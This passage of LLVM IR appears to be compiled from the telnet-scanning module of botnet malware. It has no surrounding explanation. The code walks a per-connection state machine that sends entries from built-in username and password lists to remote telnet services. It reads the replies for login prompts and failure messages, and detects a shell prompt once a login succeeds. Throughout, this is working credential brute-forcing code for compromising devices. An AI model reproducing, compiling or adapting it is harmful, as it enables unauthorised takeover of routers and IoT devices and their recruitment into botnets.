  %163 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %164 = icmp ult i32 %162, %163
  br i1 %164, label %165, label %565

; <label>:165:                                    ; preds = %157
  %166 = load i32, i32* %135, align 16
  %167 = call i32 @sclose(i32 %166)
  store i8 0, i8* %32, align 8
  %168 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 3
  store i8 1, i8* %168, align 1
  br label %565

; <label>:169:                                    ; preds = %.lr.ph
  %170 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 0, i32 0
  %171 = load i32, i32* %170, align 16
  %172 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 4
  %173 = load i8, i8* %172, align 2
  %174 = zext i8 %173 to i64
  %175 = getelementptr inbounds [10 x i8*], [10 x i8*]* @usernames, i64 0, i64 %174
  %176 = load i8*, i8** %175, align 8
  %177 = call i64 @strlen(i8* %176) #14
  %178 = call i64 @send(i32 %171, i8* %176, i64 %177, i32 16384) #3
  %179 = icmp slt i64 %178, 0
  %180 = load i32, i32* %170, align 16
  br i1 %179, label %181, label %184

; <label>:181:                                    ; preds = %169
  %182 = call i32 @sclose(i32 %180)
  store i8 0, i8* %32, align 8
  %183 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 3
  store i8 1, i8* %183, align 1
  br label %565

; <label>:184:                                    ; preds = %169
  %185 = call i64 @send(i32 %180, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.31, i64 0, i64 0), i64 2, i32 16384) #3
  %186 = icmp slt i64 %185, 0
  br i1 %186, label %187, label %191

; <label>:187:                                    ; preds = %184
  %188 = load i32, i32* %170, align 16
  %189 = call i32 @sclose(i32 %188)
  store i8 0, i8* %32, align 8
  %190 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 3
  store i8 1, i8* %190, align 1
  br label %565

; <label>:191:                                    ; preds = %184
  store i8 4, i8* %32, align 8
  br label %565

; <label>:192:                                    ; preds = %.lr.ph
  %193 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 6
  %194 = load i32, i32* %193, align 4
  %195 = icmp eq i32 %194, 0
  br i1 %195, label %196, label %198

; <label>:196:                                    ; preds = %192
  %197 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  store i32 %197, i32* %193, align 4
  br label %198

; <label>:198:                                    ; preds = %196, %192
  %199 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 0, i32 0
  %200 = load i32, i32* %199, align 16
  %201 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 8
  %202 = load i8*, i8** %201, align 8
  %203 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 7
  %204 = load i16, i16* %203, align 16
  %205 = zext i16 %204 to i32
  %206 = call i32 @readUntil(i32 %200, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.28, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %202, i32 1024, i32 %205)
  %207 = icmp eq i32 %206, 0
  br i1 %207, label %212, label %208

; <label>:208:                                    ; preds = %198
  store i32 0, i32* %193, align 4
  store i16 0, i16* %203, align 16
  %209 = load i8*, i8** %201, align 8
  %210 = call i8* @strstr(i8* %209, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.28, i64 0, i64 0)) #14
  %211 = icmp ne i8* %210, null
  %.sink2 = select i1 %211, i8 5, i8 7
  store i8 %.sink2, i8* %32, align 8
  call void @llvm.memset.p0i8.i64(i8* %209, i8 0, i64 1024, i32 1, i1 false)
  br label %565

; <label>:212:                                    ; preds = %198
  %213 = load i32, i32* %199, align 16
  %214 = load i8*, i8** %201, align 8
  %215 = load i16, i16* %203, align 16
  %216 = zext i16 %215 to i32
  %217 = call i32 @readUntil(i32 %213, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.30, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %214, i32 1024, i32 %216)
  %218 = icmp eq i32 %217, 0
  br i1 %218, label %223, label %219

; <label>:219:                                    ; preds = %212
  store i32 0, i32* %193, align 4
  store i16 0, i16* %203, align 16
  %220 = load i8*, i8** %201, align 8
  %221 = call i8* @strstr(i8* %220, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.30, i64 0, i64 0)) #14
  %222 = icmp ne i8* %221, null
  %.sink3 = select i1 %222, i8 5, i8 7
  store i8 %.sink3, i8* %32, align 8
  call void @llvm.memset.p0i8.i64(i8* %220, i8 0, i64 1024, i32 1, i1 false)
  br label %565

; <label>:223:                                    ; preds = %212
  %224 = load i8*, i8** %201, align 8
  %225 = call i8* @strstr(i8* %224, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.32, i64 0, i64 0)) #14
  %226 = icmp eq i8* %225, null
  br i1 %226, label %231, label %227

; <label>:227:                                    ; preds = %223
  %228 = load i32, i32* %199, align 16
  %229 = call i32 @sclose(i32 %228)
  store i8 0, i8* %32, align 8
  %230 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 3
  store i8 0, i8* %230, align 1
  br label %565

; <label>:231:                                    ; preds = %223
  %232 = call i8* @strstr(i8* %224, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.33, i64 0, i64 0)) #14
  %233 = icmp eq i8* %232, null
  br i1 %233, label %238, label %234

; <label>:234:                                    ; preds = %231
  %235 = load i32, i32* %199, align 16
  %236 = call i32 @sclose(i32 %235)
  store i8 0, i8* %32, align 8
  %237 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 3
  store i8 0, i8* %237, align 1
  br label %565

; <label>:238:                                    ; preds = %231
  %239 = call i8* @strstr(i8* %224, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.34, i64 0, i64 0)) #14
  %240 = icmp eq i8* %239, null
  br i1 %240, label %245, label %241

; <label>:241:                                    ; preds = %238
  %242 = load i32, i32* %199, align 16
  %243 = call i32 @sclose(i32 %242)
  store i8 0, i8* %32, align 8
  %244 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 3
  store i8 0, i8* %244, align 1
  br label %565

; <label>:245:                                    ; preds = %238
  %246 = call i8* @strstr(i8* %224, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.35, i64 0, i64 0)) #14
  %247 = icmp eq i8* %246, null
  br i1 %247, label %252, label %248

; <label>:248:                                    ; preds = %245
  %249 = load i32, i32* %199, align 16
  %250 = call i32 @sclose(i32 %249)
  store i8 0, i8* %32, align 8
  %251 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 3
  store i8 0, i8* %251, align 1
  br label %565

; <label>:252:                                    ; preds = %245
  %253 = call i8* @strstr(i8* %224, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.36, i64 0, i64 0)) #14
  %254 = icmp eq i8* %253, null
  br i1 %254, label %259, label %255

; <label>:255:                                    ; preds = %252
  %256 = load i32, i32* %199, align 16
  %257 = call i32 @sclose(i32 %256)
  store i8 0, i8* %32, align 8
  %258 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 3
  store i8 0, i8* %258, align 1
  br label %565

; <label>:259:                                    ; preds = %252
  %260 = call i8* @strstr(i8* %224, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.37, i64 0, i64 0)) #14
  %261 = icmp eq i8* %260, null
  br i1 %261, label %266, label %262

; <label>:262:                                    ; preds = %259
  %263 = load i32, i32* %199, align 16
  %264 = call i32 @sclose(i32 %263)
  store i8 0, i8* %32, align 8
  %265 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 3
  store i8 0, i8* %265, align 1
  br label %565

; <label>:266:                                    ; preds = %259
  %267 = call i8* @strstr(i8* %224, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.38, i64 0, i64 0)) #14
  %268 = icmp eq i8* %267, null
  br i1 %268, label %273, label %269

; <label>:269:                                    ; preds = %266
  %270 = load i32, i32* %199, align 16
  %271 = call i32 @sclose(i32 %270)
  store i8 0, i8* %32, align 8
  %272 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 3
  store i8 0, i8* %272, align 1
  br label %565

; <label>:273:                                    ; preds = %266
  %274 = call i8* @strstr(i8* %224, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.39, i64 0, i64 0)) #14
  %275 = icmp eq i8* %274, null
  br i1 %275, label %280, label %276

; <label>:276:                                    ; preds = %273
  %277 = load i32, i32* %199, align 16
  %278 = call i32 @sclose(i32 %277)
  store i8 0, i8* %32, align 8
  %279 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 3
  store i8 0, i8* %279, align 1
  br label %565

; <label>:280:                                    ; preds = %273
  %281 = call i64 @strlen(i8* %224) #14
  %282 = trunc i64 %281 to i16
  store i16 %282, i16* %203, align 16
  %283 = load i32, i32* %193, align 4
  %284 = add i32 %283, 10
  %285 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %286 = icmp ult i32 %284, %285
  br i1 %286, label %287, label %565

; <label>:287:                                    ; preds = %280
  %288 = load i32, i32* %199, align 16
  %289 = call i32 @sclose(i32 %288)
  store i8 0, i8* %32, align 8
  %290 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 3
  store i8 1, i8* %290, align 1
  br label %565

; <label>:291:                                    ; preds = %.lr.ph
  %292 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 0, i32 0
  %293 = load i32, i32* %292, align 16
  %294 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 5
  %295 = load i8, i8* %294, align 1
  %296 = zext i8 %295 to i64
  %297 = getelementptr inbounds [18 x i8*], [18 x i8*]* @passwords, i64 0, i64 %296
  %298 = load i8*, i8** %297, align 8
  %299 = call i64 @strlen(i8* %298) #14
  %300 = call i64 @send(i32 %293, i8* %298, i64 %299, i32 16384) #3
  %301 = icmp slt i64 %300, 0
  %302 = load i32, i32* %292, align 16
  br i1 %301, label %303, label %306

; <label>:303:                                    ; preds = %291
  %304 = call i32 @sclose(i32 %302)
  store i8 0, i8* %32, align 8
  %305 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 3
  store i8 1, i8* %305, align 1
  br label %565

; <label>:306:                                    ; preds = %291
  %307 = call i64 @send(i32 %302, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.31, i64 0, i64 0), i64 2, i32 16384) #3
  %308 = icmp slt i64 %307, 0
  br i1 %308, label %309, label %313

; <label>:309:                                    ; preds = %306
  %310 = load i32, i32* %292, align 16
  %311 = call i32 @sclose(i32 %310)
  store i8 0, i8* %32, align 8
  %312 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 3
  store i8 1, i8* %312, align 1
  br label %565

; <label>:313:                                    ; preds = %306
  store i8 6, i8* %32, align 8
  br label %565

; <label>:314:                                    ; preds = %.lr.ph
  %315 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 6
  %316 = load i32, i32* %315, align 4
  %317 = icmp eq i32 %316, 0
  br i1 %317, label %318, label %320

; <label>:318:                                    ; preds = %314
  %319 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  store i32 %319, i32* %315, align 4
  br label %320

; <label>:320:                                    ; preds = %318, %314
  %321 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 0, i32 0
  %322 = load i32, i32* %321, align 16
  %323 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 8
  %324 = load i8*, i8** %323, align 8
  %325 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 7
  %326 = load i16, i16* %325, align 16
  %327 = zext i16 %326 to i32
  %328 = call i32 @readUntil(i32 %322, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.32, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %324, i32 1024, i32 %327)
  %329 = icmp eq i32 %328, 0
  br i1 %329, label %346, label %330

; <label>:330:                                    ; preds = %320
  store i32 0, i32* %315, align 4
  store i16 0, i16* %325, align 16
  %331 = load i8*, i8** %323, align 8
  %332 = call i8* @strstr(i8* %331, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.32, i64 0, i64 0)) #14
  %333 = icmp eq i8* %332, null
  br i1 %333, label %338, label %334

; <label>:334:                                    ; preds = %330
  call void @llvm.memset.p0i8.i64(i8* %331, i8 0, i64 1024, i32 1, i1 false)
  %335 = load i32, i32* %321, align 16
  %336 = call i32 @sclose(i32 %335)
  store i8 0, i8* %32, align 8
  %337 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 3
  store i8 0, i8* %337, align 1
  br label %565

; <label>:338:                                    ; preds = %330
  %339 = call i32 @matchPrompt(i8* %331)
  %340 = icmp eq i32 %339, 0
  br i1 %340, label %341, label %345

; <label>:341:                                    ; preds = %338
  call void @llvm.memset.p0i8.i64(i8* %331, i8 0, i64 1024, i32 1, i1 false)
  %342 = load i32, i32* %321, align 16
  %343 = call i32 @sclose(i32 %342)
  store i8 0, i8* %32, align 8
  %344 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 3
  store i8 1, i8* %344, align 1
  br label %565

; <label>:345:                                    ; preds = %338
  store i8 7, i8* %32, align 8
  call void @llvm.memset.p0i8.i64(i8* %331, i8 0, i64 1024, i32 1, i1 false)
  br label %565

; <label>:346:                                    ; preds = %320
  %347 = load i32, i32* %321, align 16
  %348 = load i8*, i8** %323, align 8
  %349 = load i16, i16* %325, align 16
  %350 = zext i16 %349 to i32
  %351 = call i32 @readUntil(i32 %347, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.33, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %348, i32 1024, i32 %350)
  %352 = icmp eq i32 %351, 0
  br i1 %352, label %369, label %353

; <label>:353:                                    ; preds = %346
  store i32 0, i32* %315, align 4
  store i16 0, i16* %325, align 16
  %354 = load i8*, i8** %323, align 8
  %355 = call i8* @strstr(i8* %354, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.33, i64 0, i64 0)) #14
  %356 = icmp eq i8* %355, null
  br i1 %356, label %361, label %357

; <label>:357:                                    ; preds = %353
  call void @llvm.memset.p0i8.i64(i8* %354, i8 0, i64 1024, i32 1, i1 false)
  %358 = load i32, i32* %321, align 16
  %359 = call i32 @sclose(i32 %358)
  store i8 0, i8* %32, align 8
  %360 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 3
  store i8 0, i8* %360, align 1
  br label %565

; <label>:361:                                    ; preds = %353
  %362 = call i32 @matchPrompt(i8* %354)
  %363 = icmp eq i32 %362, 0
  br i1 %363, label %364, label %368

; <label>:364:                                    ; preds = %361
  call void @llvm.memset.p0i8.i64(i8* %354, i8 0, i64 1024, i32 1, i1 false)
  %365 = load i32, i32* %321, align 16
  %366 = call i32 @sclose(i32 %365)
  store i8 0, i8* %32, align 8
  %367 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 3
  store i8 1, i8* %367, align 1
  br label %565

; <label>:368:                                    ; preds = %361
  store i8 7, i8* %32, align 8
  call void @llvm.memset.p0i8.i64(i8* %354, i8 0, i64 1024, i32 1, i1 false)
  br label %565

; <label>:369:                                    ; preds = %346
  %370 = load i32, i32* %321, align 16
  %371 = load i8*, i8** %323, align 8
  %372 = load i16, i16* %325, align 16
  %373 = zext i16 %372 to i32
  %374 = call i32 @readUntil(i32 %370, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.34, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %371, i32 1024, i32 %373)
  %375 = icmp eq i32 %374, 0
  br i1 %375, label %392, label %376

; <label>:376:                                    ; preds = %369
  store i32 0, i32* %315, align 4
  store i16 0, i16* %325, align 16
  %377 = load i8*, i8** %323, align 8
  %378 = call i8* @strstr(i8* %377, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.34, i64 0, i64 0)) #14
  %379 = icmp eq i8* %378, null
  br i1 %379, label %384, label %380

; <label>:380:                                    ; preds = %376
  call void @llvm.memset.p0i8.i64(i8* %377, i8 0, i64 1024, i32 1, i1 false)
  %381 = load i32, i32* %321, align 16
  %382 = call i32 @sclose(i32 %381)
  store i8 0, i8* %32, align 8
  %383 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 3
  store i8 0, i8* %383, align 1
  br label %565

; <label>:384:                                    ; preds = %376
  %385 = call i32 @matchPrompt(i8* %377)
  %386 = icmp eq i32 %385, 0
  br i1 %386, label %387, label %391

; <label>:387:                                    ; preds = %384
  call void @llvm.memset.p0i8.i64(i8* %377, i8 0, i64 1024, i32 1, i1 false)
  %388 = load i32, i32* %321, align 16
  %389 = call i32 @sclose(i32 %388)
  store i8 0, i8* %32, align 8
  %390 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 3
  store i8 1, i8* %390, align 1
  br label %565

; <label>:391:                                    ; preds = %384
  store i8 7, i8* %32, align 8
  call void @llvm.memset.p0i8.i64(i8* %377, i8 0, i64 1024, i32 1, i1 false)
  br label %565

; <label>:392:                                    ; preds = %369
  %393 = load i32, i32* %321, align 16
  %394 = load i8*, i8** %323, align 8
  %395 = load i16, i16* %325, align 16
  %396 = zext i16 %395 to i32
  %397 = call i32 @readUntil(i32 %393, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.35, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %394, i32 1024, i32 %396)
  %398 = icmp eq i32 %397, 0
  br i1 %398, label %415, label %399

; <label>:399:                                    ; preds = %392
  store i32 0, i32* %315, align 4
  store i16 0, i16* %325, align 16
  %400 = load i8*, i8** %323, align 8
  %401 = call i8* @strstr(i8* %400, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.35, i64 0, i64 0)) #14
  %402 = icmp eq i8* %401, null
  br i1 %402, label %407, label %403

; <label>:403:                                    ; preds = %399
  call void @llvm.memset.p0i8.i64(i8* %400, i8 0, i64 1024, i32 1, i1 false)
  %404 = load i32, i32* %321, align 16
  %405 = call i32 @sclose(i32 %404)
  store i8 0, i8* %32, align 8
  %406 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 3
  store i8 0, i8* %406, align 1
  br label %565

; <label>:407:                                    ; preds = %399
  %408 = call i32 @matchPrompt(i8* %400)
  %409 = icmp eq i32 %408, 0
  br i1 %409, label %410, label %414

; <label>:410:                                    ; preds = %407
  call void @llvm.memset.p0i8.i64(i8* %400, i8 0, i64 1024, i32 1, i1 false)
  %411 = load i32, i32* %321, align 16
  %412 = call i32 @sclose(i32 %411)
  store i8 0, i8* %32, align 8
  %413 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 3
  store i8 1, i8* %413, align 1
  br label %565

; <label>:414:                                    ; preds = %407
  store i8 7, i8* %32, align 8
  call void @llvm.memset.p0i8.i64(i8* %400, i8 0, i64 1024, i32 1, i1 false)
  br label %565

; <label>:415:                                    ; preds = %392
  %416 = load i32, i32* %321, align 16
  %417 = load i8*, i8** %323, align 8
  %418 = load i16, i16* %325, align 16
  %419 = zext i16 %418 to i32
  %420 = call i32 @readUntil(i32 %416, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.36, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %417, i32 1024, i32 %419)
  %421 = icmp eq i32 %420, 0
  br i1 %421, label %438, label %422

; <label>:422:                                    ; preds = %415
  store i32 0, i32* %315, align 4
  store i16 0, i16* %325, align 16
  %423 = load i8*, i8** %323, align 8
  %424 = call i8* @strstr(i8* %423, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.36, i64 0, i64 0)) #14
  %425 = icmp eq i8* %424, null
  br i1 %425, label %430, label %426

; <label>:426:                                    ; preds = %422
  call void @llvm.memset.p0i8.i64(i8* %423, i8 0, i64 1024, i32 1, i1 false)
  %427 = load i32, i32* %321, align 16
  %428 = call i32 @sclose(i32 %427)
  store i8 0, i8* %32, align 8
  %429 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 3
  store i8 0, i8* %429, align 1
  br label %565

; <label>:430:                                    ; preds = %422
  %431 = call i32 @matchPrompt(i8* %423)
  %432 = icmp eq i32 %431, 0
  br i1 %432, label %433, label %437

; <label>:433:                                    ; preds = %430
  call void @llvm.memset.p0i8.i64(i8* %423, i8 0, i64 1024, i32 1, i1 false)
  %434 = load i32, i32* %321, align 16
  %435 = call i32 @sclose(i32 %434)
  store i8 0, i8* %32, align 8
  %436 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 3
  store i8 1, i8* %436, align 1
  br label %565

; <label>:437:                                    ; preds = %430
  store i8 7, i8* %32, align 8
  call void @llvm.memset.p0i8.i64(i8* %423, i8 0, i64 1024, i32 1, i1 false)
  br label %565

; <label>:438:                                    ; preds = %415
  %439 = load i32, i32* %321, align 16
  %440 = load i8*, i8** %323, align 8
  %441 = load i16, i16* %325, align 16
  %442 = zext i16 %441 to i32
  %443 = call i32 @readUntil(i32 %439, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.37, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %440, i32 1024, i32 %442)
  %444 = icmp eq i32 %443, 0
  br i1 %444, label %461, label %445

; <label>:445:                                    ; preds = %438
  store i32 0, i32* %315, align 4
  store i16 0, i16* %325, align 16
  %446 = load i8*, i8** %323, align 8
  %447 = call i8* @strstr(i8* %446, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.37, i64 0, i64 0)) #14
  %448 = icmp eq i8* %447, null
  br i1 %448, label %453, label %449

; <label>:449:                                    ; preds = %445
  call void @llvm.memset.p0i8.i64(i8* %446, i8 0, i64 1024, i32 1, i1 false)
  %450 = load i32, i32* %321, align 16
  %451 = call i32 @sclose(i32 %450)
  store i8 0, i8* %32, align 8
  %452 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 3
  store i8 0, i8* %452, align 1
  br label %565

; <label>:453:                                    ; preds = %445
  %454 = call i32 @matchPrompt(i8* %446)
  %455 = icmp eq i32 %454, 0
  br i1 %455, label %456, label %460

; <label>:456:                                    ; preds = %453
  call void @llvm.memset.p0i8.i64(i8* %446, i8 0, i64 1024, i32 1, i1 false)
  %457 = load i32, i32* %321, align 16
  %458 = call i32 @sclose(i32 %457)
  store i8 0, i8* %32, align 8
  %459 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 3
  store i8 1, i8* %459, align 1
  br label %565

; <label>:460:                                    ; preds = %453
  store i8 7, i8* %32, align 8
  call void @llvm.memset.p0i8.i64(i8* %446, i8 0, i64 1024, i32 1, i1 false)
  br label %565

; <label>:461:                                    ; preds = %438
  %462 = load i32, i32* %321, align 16
  %463 = load i8*, i8** %323, align 8
  %464 = load i16, i16* %325, align 16
  %465 = zext i16 %464 to i32
  %466 = call i32 @readUntil(i32 %462, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.38, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %463, i32 1024, i32 %465)
  %467 = icmp eq i32 %466, 0
  br i1 %467, label %484, label %468

; <label>:468:                                    ; preds = %461
  store i32 0, i32* %315, align 4
  store i16 0, i16* %325, align 16
  %469 = load i8*, i8** %323, align 8
  %470 = call i8* @strstr(i8* %469, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.38, i64 0, i64 0)) #14
  %471 = icmp eq i8* %470, null
  br i1 %471, label %476, label %472

; <label>:472:                                    ; preds = %468
  call void @llvm.memset.p0i8.i64(i8* %469, i8 0, i64 1024, i32 1, i1 false)
  %473 = load i32, i32* %321, align 16
  %474 = call i32 @sclose(i32 %473)
  store i8 0, i8* %32, align 8
  %475 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 3
  store i8 0, i8* %475, align 1
  br label %565

; <label>:476:                                    ; preds = %468
  %477 = call i32 @matchPrompt(i8* %469)
  %478 = icmp eq i32 %477, 0
  br i1 %478, label %479, label %483

; <label>:479:                                    ; preds = %476
  call void @llvm.memset.p0i8.i64(i8* %469, i8 0, i64 1024, i32 1, i1 false)
  %480 = load i32, i32* %321, align 16
  %481 = call i32 @sclose(i32 %480)
  store i8 0, i8* %32, align 8
  %482 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 3
  store i8 1, i8* %482, align 1
  br label %565

; <label>:483:                                    ; preds = %476
  store i8 7, i8* %32, align 8
  call void @llvm.memset.p0i8.i64(i8* %469, i8 0, i64 1024, i32 1, i1 false)
  br label %565

; <label>:484:                                    ; preds = %461
  %485 = load i32, i32* %321, align 16
  %486 = load i8*, i8** %323, align 8
  %487 = load i16, i16* %325, align 16
  %488 = zext i16 %487 to i32
  %489 = call i32 @readUntil(i32 %485, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.39, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %486, i32 1024, i32 %488)
  %490 = icmp eq i32 %489, 0
  br i1 %490, label %507, label %491

; <label>:491:                                    ; preds = %484
  store i32 0, i32* %315, align 4
  store i16 0, i16* %325, align 16
  %492 = load i8*, i8** %323, align 8
  %493 = call i8* @strstr(i8* %492, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.39, i64 0, i64 0)) #14
  %494 = icmp eq i8* %493, null
  br i1 %494, label %499, label %495

; <label>:495:                                    ; preds = %491
  call void @llvm.memset.p0i8.i64(i8* %492, i8 0, i64 1024, i32 1, i1 false)
  %496 = load i32, i32* %321, align 16
  %497 = call i32 @sclose(i32 %496)
  store i8 0, i8* %32, align 8
  %498 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 3
  store i8 0, i8* %498, align 1
  br label %565

; <label>:499:                                    ; preds = %491
  %500 = call i32 @matchPrompt(i8* %492)
  %501 = icmp eq i32 %500, 0
  br i1 %501, label %502, label %506

; <label>:502:                                    ; preds = %499
  call void @llvm.memset.p0i8.i64(i8* %492, i8 0, i64 1024, i32 1, i1 false)
  %503 = load i32, i32* %321, align 16
  %504 = call i32 @sclose(i32 %503)
  store i8 0, i8* %32, align 8
  %505 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 3
  store i8 1, i8* %505, align 1
  br label %565

; <label>:506:                                    ; preds = %499
  store i8 7, i8* %32, align 8
  call void @llvm.memset.p0i8.i64(i8* %492, i8 0, i64 1024, i32 1, i1 false)
  br label %565

; <label>:507:                                    ; preds = %484
  %508 = load i8*, i8** %323, align 8
  %509 = call i64 @strlen(i8* %508) #14
  %510 = trunc i64 %509 to i16
  store i16 %510, i16* %325, align 16
  %511 = load i32, i32* %315, align 4
  %512 = add i32 %511, 10
  %513 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %514 = icmp ult i32 %512, %513
  br i1 %514, label %515, label %565

; <label>:515:                                    ; preds = %507
  %516 = load i32, i32* %321, align 16
  %517 = call i32 @sclose(i32 %516)
  store i8 0, i8* %32, align 8
  %518 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 3
  store i8 1, i8* %518, align 1
  br label %565

; <label>:519:                                    ; preds = %.lr.ph
  %520 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 0, i32 0
  %521 = load i32, i32* %520, align 16
  %522 = call i64 @send(i32 %521, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.40, i64 0, i64 0), i64 4, i32 16384) #3
  %523 = icmp slt i64 %522, 0
  br i1 %523, label %524, label %528

; <label>:524:                                    ; preds = %519
  %525 = load i32, i32* %520, align 16
  %526 = call i32 @sclose(i32 %525)
  store i8 0, i8* %32, align 8
  %527 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 3
  store i8 1, i8* %527, align 1
  br label %565

; <label>:528:                                    ; preds = %519
  store i8 8, i8* %32, align 8
  br label %565

; <label>:529:                                    ; preds = %.lr.ph
  %530 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 0, i32 0
  %531 = load i32, i32* %530, align 16
  %532 = call i64 @send(i32 %531, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.43, i64 0, i64 0), i64 9, i32 16384) #3
  %533 = icmp slt i64 %532, 0
  br i1 %533, label %534, label %538

; <label>:534:                                    ; preds = %529
  %535 = load i32, i32* %530, align 16
  %536 = call i32 @sclose(i32 %535)
  store i8 0, i8* %32, align 8
  %537 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 3
  store i8 1, i8* %537, align 1
  br label %565

; <label>:538:                                    ; preds = %529
  store i8 9, i8* %32, align 8
  br label %565

; <label>:539:                                    ; preds = %.lr.ph
  %540 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 6
  %541 = load i32, i32* %540, align 4
  %542 = icmp eq i32 %541, 0
  br i1 %542, label %543, label %545

; <label>:543:                                    ; preds = %539
  %544 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
